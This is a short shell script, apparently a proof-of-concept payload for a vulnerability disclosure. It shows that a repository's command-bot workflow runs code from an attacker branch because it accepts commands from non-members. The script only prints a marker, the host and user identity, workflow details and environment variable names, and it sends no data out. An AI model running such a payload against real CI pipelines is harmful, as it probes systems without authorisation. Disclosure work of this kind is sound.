#!/bin/sh
# PoC payload: this file lives on the "attacker" branch and is executed by the
# base repository's cmd workflow because /cmd accepts non-members.
echo "=== POC-MARKER: attacker-controlled script executed in the command bot job ==="
echo "hostname: $(hostname)"
echo "whoami: $(id)"
echo "workflow: ${GITHUB_WORKFLOW:-?} ref: ${GITHUB_REF:-?} repo: ${GITHUB_REPOSITORY:-?}"
echo "job container env keys: $(env | cut -d= -f1 | sort | tr '\n' ' ')"
echo "=== END POC-MARKER ==="
